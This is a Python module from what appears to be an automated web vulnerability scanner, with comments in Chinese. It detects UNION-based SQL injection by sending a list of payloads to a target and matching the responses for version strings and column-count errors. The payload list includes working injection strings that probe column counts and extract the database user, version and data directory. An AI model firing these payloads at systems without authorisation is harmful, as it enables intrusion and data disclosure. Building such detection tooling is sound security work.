"""
聯合檢測引擎 - 基於UNION查詢的SQL注入檢測
"""

from __future__ import annotations

import re

import httpx

from services.aiva_common.schemas import FunctionTaskPayload
from services.aiva_common.utils import get_logger

from ..detection_models import DetectionResult
from ..payload_wrapper_encoder import PayloadWrapperEncoder

logger = get_logger(__name__)


class UnionDetectionEngine:
    """聯合檢測引擎 - 檢測基於UNION的SQL注入"""

    def __init__(self):
        # UNION載荷 - 測試不同欄位數量
        self.union_payloads = [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL, NULL --",
            "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
            "' UNION SELECT 1 --",
            "' UNION SELECT 1, 2 --",
            "' UNION SELECT 1, 2, 3 --",
            "' UNION SELECT 1, 2, 3, 4 --",
            "' UNION SELECT 1, 2, 3, 4, 5 --",
            # 測試資訊揭露
            "' UNION SELECT user(), database() --",
            "' UNION SELECT version(), user() --",
            "' UNION SELECT @@version, @@datadir --",
            # 括弧變體
            "') UNION SELECT NULL --",
            "') UNION SELECT NULL, NULL --",
            '") UNION SELECT NULL --',
            '") UNION SELECT NULL, NULL --',
        ]

        # UNION成功指示器
        self.union_indicators = [
            r"mysql.*version",
            r"postgresql.*version",
            r"microsoft.*sql.*server",
            r"oracle.*database",
            r"sqlite.*version",
            r"\d+\.\d+\.\d+",  # 版本號格式
            r"root@.*",  # MySQL用戶格式
            r"postgres@.*",  # PostgreSQL用戶格式
        ]

        # 錯誤訊息（表示UNION語法有效但欄位數不匹配）
        self.column_count_errors = [
            r"The used SELECT statements have a different number of columns",
            r"SELECTs to the left and right of UNION do not have the same number of result columns",
            r"All queries combined using a UNION.*must have the same number of columns",
        ]

    async def detect(
        self, task: FunctionTaskPayload, client: httpx.AsyncClient
    ) -> list[DetectionResult]:
        """執行UNION檢測"""
        results: list[DetectionResult] = []
        encoder = PayloadWrapperEncoder(task)

        logger.debug(f"Starting UNION detection for task {task.task_id}")

        # 獲取基準回應以進行比較
        baseline_response = await self._get_baseline_response(task, client, encoder)
        if not baseline_response:
            logger.warning("Failed to get baseline response")
            return results

        baseline_content = baseline_response.text or ""

        for payload in self.union_payloads:
            try:
                # 發送UNION載荷
                encoded = encoder.encode(payload)
                response = await client.request(
                    method=encoded.method, url=encoded.url, **encoded.request_kwargs
                )

                response_content = response.text or ""

                # 檢查UNION成功指示
                union_success = self._check_union_success(response_content)
                column_error = self._check_column_count_error(response_content)
                content_change = self._check_content_change(
                    baseline_content, response_content
                )

                if union_success or column_error or content_change:
                    result = self._build_detection_result(
                        payload=payload,
                        response=response,
                        baseline_response=baseline_response,
                        detection_type=self._get_detection_type(
                            union_success, column_error, content_change
                        ),
                        task=task,
                    )
                    results.append(result)
                    logger.info(f"UNION SQL injection detected with payload: {payload}")

            except Exception as e:
                logger.warning(f"UNION detection failed for payload '{payload}': {e}")
                continue

        logger.debug(f"UNION detection completed. Found {len(results)} vulnerabilities")
        return results

    async def _get_baseline_response(
        self,
        task: FunctionTaskPayload,
        client: httpx.AsyncClient,
        encoder: PayloadWrapperEncoder,
    ) -> httpx.Response | None:
        """獲取基準回應"""
        try:
            encoded = encoder.encode("")  # 空載荷
            return await client.request(
                method=encoded.method, url=encoded.url, **encoded.request_kwargs
            )
        except Exception as e:
            logger.error(f"Failed to get baseline response: {e}")
            return None

    def _check_union_success(self, content: str) -> bool:
        """檢查UNION查詢是否成功"""
        content_lower = content.lower()
        for pattern in self.union_indicators:
            if re.search(pattern, content_lower):
                return True
        return False

    def _check_column_count_error(self, content: str) -> bool:
        """檢查欄位數量錯誤（表示UNION語法有效）"""
        for pattern in self.column_count_errors:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def _check_content_change(self, baseline: str, response: str) -> bool:
        """檢查內容變化（可能表示UNION成功）"""
        baseline_len = len(baseline)
        response_len = len(response)

        # 檢查顯著的長度變化
        if baseline_len > 0:
            length_diff = abs(response_len - baseline_len) / baseline_len
            if length_diff > 0.2:  # 20%以上的變化
                return True

        # 檢查新出現的數字模式（可能來自UNION SELECT 1,2,3...）
        baseline_numbers = set(re.findall(r"\b\d+\b", baseline))
        response_numbers = set(re.findall(r"\b\d+\b", response))
        new_numbers = response_numbers - baseline_numbers

        # 如果出現連續數字（1,2,3等），可能是UNION成功
        if len(new_numbers) >= 2:
            sorted_numbers = sorted([int(n) for n in new_numbers if n.isdigit()])
            if len(sorted_numbers) >= 2:
                for i in range(len(sorted_numbers) - 1):
                    if sorted_numbers[i + 1] - sorted_numbers[i] == 1:
                        return True

        return False

    def _get_detection_type(
        self, union_success: bool, column_error: bool, content_change: bool
    ) -> str:
        """確定檢測類型"""
        if union_success:
            return "union_success"
        elif column_error:
            return "column_count_error"
        elif content_change:
            return "content_change"
        else:
            return "unknown"

    def _build_detection_result(
        self,
        payload: str,
        response: httpx.Response,
        baseline_response: httpx.Response,
        detection_type: str,
        task: FunctionTaskPayload,
    ) -> DetectionResult:
        """構建檢測結果"""
        from services.aiva_common.enums import Confidence, Severity, VulnerabilityType
        from services.aiva_common.schemas import (
            FindingEvidence,
            FindingImpact,
            FindingRecommendation,
            FindingTarget,
            Vulnerability,
        )

        # 根據檢測類型確定信心度
        confidence_map = {
            "union_success": 0.95,
            "column_count_error": 0.85,
            "content_change": 0.7,
            "unknown": 0.6,
        }

        confidence_score = confidence_map.get(detection_type, 0.6)

        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.HIGH,
            confidence=Confidence.FIRM
            if confidence_score > 0.8
            else Confidence.POSSIBLE,
        )

        # 構建證據描述
        evidence_desc = f"UNION payload '{payload}' "
        if detection_type == "union_success":
            evidence_desc += "successfully executed and returned database information."
        elif detection_type == "column_count_error":
            evidence_desc += (
                "triggered column count mismatch errors, confirming "
                "UNION syntax validity."
            )
        elif detection_type == "content_change":
            evidence_desc += (
                "caused significant content changes, indicating "
                "successful UNION query execution."
            )

        evidence = FindingEvidence(
            request=f"Payload: {payload}",
            response=(
                f"Status: {response.status_code}, "
                f"Length: {len(response.text or '')}, "
                f"Baseline length: {len(baseline_response.text or '')}"
            ),
            proof=evidence_desc,
        )

        impact = FindingImpact(
            business_impact=(
                "Critical - potential for complete database data extraction"
            )
        )

        recommendation = FindingRecommendation(
            fix=(
                "Implement parameterized queries and input validation "
                "immediately. Conduct security code review and implement "
                "database access controls."
            ),
            priority="High",
        )

        target = FindingTarget(
            url=str(response.url),
            method=task.target.method,
            parameter=task.target.parameter,
        )

        return DetectionResult(
            is_vulnerable=True,
            vulnerability=vulnerability,
            evidence=evidence,
            impact=impact,
            recommendation=recommendation,
            target=target,
            detection_method="union_based",
            payload_used=payload,
            confidence_score=confidence_score,
        )
